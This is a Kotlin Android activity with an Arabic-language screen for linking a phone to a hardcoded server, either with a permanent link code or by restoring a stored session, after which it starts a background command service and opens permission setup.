package com.abuzahra.manager

import android.content.Intent
import android.os.Bundle
import android.util.Log
import android.view.View
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.abuzahra.manager.api.ApiClient
import com.abuzahra.manager.service.CommandService
import com.abuzahra.manager.util.DeviceUtils
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

/**
 * LinkActivity (Phase 3 redesign)
 *
 * Two-action UI for linking this device to the Abu-Zahra server:
 *
 *   1. "🔗 ربط هاتف جديد" (Link New Phone)
 *      - Reveals a code input section where the user enters their permanent
 *        link code (one lifelong code per email, stored in Firebase).
 *      - On confirm → ApiClient.linkDevice(context, code) → POST /api/register.
 *      - On success: starts CommandService + navigates to PermissionActivity
 *        (first-launch permission setup), then to MainActivity.
 *
 *   2. "♻️ استعادة جلسة" (Restore Session)
 *      - No code needed — uses the locally-stored device_id + device_token.
 *      - On click → ApiClient.restoreSession(context) → POST /api/restore_session.
 *      - On 200: starts CommandService + navigates straight to MainActivity
 *        (permissions were already granted on the original link).
 *      - On 404: shows "لا توجد جلسة سابقة لهذا الجهاز. استخدم 'ربط هاتف جديد'".
 *
 * The server URL is hardcoded in [Config] (https://alsydyabwalzhra.online) and
 * is NOT user-editable from this screen — the server is the verification
 * intermediary for the lifelong link code.
 *
 * All UI text is in Arabic. Layout is RTL.
 */
class LinkActivity : AppCompatActivity() {

    companion object {
        private const val TAG = "LinkActivity"
    }

    // Views
    private lateinit var textStatus: TextView
    private lateinit var textDeviceId: TextView
    private lateinit var btnLinkNew: Button
    private lateinit var btnRestore: Button
    private lateinit var btnPerms: Button
    private lateinit var codeSection: LinearLayout
    private lateinit var editCode: EditText
    private lateinit var btnConfirmCode: Button
    private lateinit var btnCancelCode: Button

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // If already linked, skip straight to MainActivity.
        if (DeviceUtils.isLinked(this)) {
            startActivity(Intent(this, MainActivity::class.java))
            finish()
            return
        }

        setContentView(R.layout.activity_link)

        // Wire up views
        textStatus = findViewById(R.id.textStatus)
        textDeviceId = findViewById(R.id.textDeviceId)
        btnLinkNew = findViewById(R.id.btnLinkNew)
        btnRestore = findViewById(R.id.btnRestore)
        btnPerms = findViewById(R.id.btnPerms)
        codeSection = findViewById(R.id.codeSection)
        editCode = findViewById(R.id.editCode)
        btnConfirmCode = findViewById(R.id.btnConfirmCode)
        btnCancelCode = findViewById(R.id.btnCancelCode)

        // Show device ID (informational)
        textDeviceId.text = "معرّف الجهاز: ${DeviceUtils.getDeviceId(this)}"

        // ===== Action 1: Link New Phone =====
        btnLinkNew.setOnClickListener {
            showCodeSection(true)
            textStatus.text = "أدخل كود الربط الدائم الخاص بحسابك."
            editCode.requestFocus()
        }

        btnCancelCode.setOnClickListener {
            showCodeSection(false)
            editCode.setText("")
            textStatus.text = ""
        }

        btnConfirmCode.setOnClickListener {
            val rawCode = editCode.text.toString().trim()
            if (rawCode.isBlank()) {
                Toast.makeText(this, "أدخل كود الربط", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }
            val code = rawCode.uppercase()
            editCode.setText(code)
            attemptLinkNew(code)
        }

        // ===== Action 2: Restore Session =====
        btnRestore.setOnClickListener {
            attemptRestore()
        }

        // ===== Permissions shortcut (always available) =====
        btnPerms.setOnClickListener {
            startActivity(Intent(this, PermissionActivity::class.java))
        }
    }

    /** Toggle the code-input section visibility + main action buttons. */
    private fun showCodeSection(show: Boolean) {
        codeSection.visibility = if (show) View.VISIBLE else View.GONE
        // While entering a code, dim the other actions to keep the user focused.
        val otherAlpha = if (show) 0.4f else 1f
        btnRestore.alpha = otherAlpha
        btnRestore.isEnabled = !show
        btnLinkNew.isEnabled = !show
    }

    /** Re-enable all action buttons (called after a failed attempt). */
    private fun resetActionButtons() {
        btnLinkNew.isEnabled = true
        btnRestore.isEnabled = true
        btnRestore.alpha = 1f
        btnConfirmCode.isEnabled = true
    }

    /**
     * Attempt to link this device using a permanent link code.
     * Flow: testHealth → linkDevice → setLinked → CommandService → PermissionActivity.
     */
    private fun attemptLinkNew(code: String) {
        btnConfirmCode.isEnabled = false
        btnRestore.isEnabled = false
        btnLinkNew.isEnabled = false
        textStatus.text = "جارٍ الاتصال بالخادم..."

        lifecycleScope.launch {
            try {
                // First test server connectivity
                textStatus.text = "جارٍ فحص الاتصال بالخادم..."
                val canConnect = ApiClient.testHealth()
                if (!canConnect) {
                    textStatus.text = "تعذّر الاتصال بالخادم.\nتأكّد من اتصال الإنترنت وحاول مجدداً."
                    resetActionButtons()
                    return@launch
                }

                textStatus.text = "الخادم متاح، جارٍ ربط الجهاز..."

                val result = ApiClient.linkDevice(this@LinkActivity, code)
                if (result.ok || result.success) {
                    textStatus.text = "تم ربط الجهاز بنجاح!\n${result.message}"
                    Toast.makeText(this@LinkActivity, "تم ربط الجهاز!", Toast.LENGTH_SHORT).show()

                    // Start foreground command service
                    CommandService.start(this@LinkActivity)

                    // Give the service a moment to come up, then go to permission setup.
                    delay(1000)
                    val permIntent = Intent(this@LinkActivity, PermissionActivity::class.java)
                    permIntent.putExtra(PermissionActivity.EXTRA_NAVIGATE_TO_MAIN, true)
                    permIntent.putExtra(PermissionActivity.EXTRA_FIRST_LAUNCH, true)
                    startActivity(permIntent)
                    finish()
                } else {
                    val err = result.error.ifBlank { result.message.ifBlank { "فشل الربط." } }
                    textStatus.text = "فشل الربط: $err"
                    resetActionButtons()
                    Toast.makeText(this@LinkActivity, err, Toast.LENGTH_LONG).show()
                }
            } catch (e: Exception) {
                Log.e(TAG, "linkNew error", e)
                textStatus.text = formatErrorMessage(e)
                resetActionButtons()
                Toast.makeText(this@LinkActivity, "فشل الاتصال: ${(e.message ?: "").take(100)}", Toast.LENGTH_LONG).show()
            }
        }
    }

    /**
     * Attempt to restore a previous linking using the locally-stored
     * device_id + device_token (no code required).
     * Flow: restoreSession → setLinked → CommandService → MainActivity (NO permission flow).
     */
    private fun attemptRestore() {
        btnRestore.isEnabled = false
        btnLinkNew.isEnabled = false
        btnConfirmCode.isEnabled = false
        textStatus.text = "جارٍ استعادة الجلسة..."

        lifecycleScope.launch {
            try {
                val result = ApiClient.restoreSession(this@LinkActivity)
                if (result.ok || result.success) {
                    DeviceUtils.setLinked(this@LinkActivity, true)
                    textStatus.text = "تمت استعادة الجلسة بنجاح!\n${result.message}"
                    Toast.makeText(this@LinkActivity, "تمت الاستعادة!", Toast.LENGTH_SHORT).show()

                    CommandService.start(this@LinkActivity)

                    // Restore goes straight to MainActivity — permissions were already
                    // granted during the original link, no need to walk through them again.
                    delay(1000)
                    startActivity(Intent(this@LinkActivity, MainActivity::class.java))
                    finish()
                } else {
                    val err = result.error.ifBlank { result.message.ifBlank { "فشلت الاستعادة." } }
                    textStatus.text = err
                    resetActionButtons()
                    Toast.makeText(this@LinkActivity, err, Toast.LENGTH_LONG).show()
                }
            } catch (e: Exception) {
                Log.e(TAG, "restore error", e)
                textStatus.text = formatErrorMessage(e)
                resetActionButtons()
                Toast.makeText(this@LinkActivity, "فشل الاتصال: ${(e.message ?: "").take(100)}", Toast.LENGTH_LONG).show()
            }
        }
    }

    /** Map low-level network exceptions to user-friendly Arabic messages. */
    private fun formatErrorMessage(e: Throwable): String {
        val msg = e.message ?: "خطأ غير معروف"
        return when {
            msg.contains("BEGIN_OBJECT") || msg.contains("NUMBER") -> {
                "استجابة غير صالحة من الخادم.\nتأكّد من أن الخادم يعمل بالإصدار الصحيح."
            }
            msg.contains("Connection refused") || msg.contains("Failed to connect") || msg.contains("timed out") -> {
                "تعذّر الاتصال بالخادم.\n${Config.SERVER_DOMAIN}\nهل الخادم يعمل؟"
            }
            msg.contains("SSL") || msg.contains("certificate") -> {
                "خطأ في شهادة SSL: $msg"
            }
            msg.contains("non-JSON") || msg.contains("HTML") -> {
                "خطأ في الخادم: $msg"
            }
            else -> "خطأ: $msg"
        }
    }
}
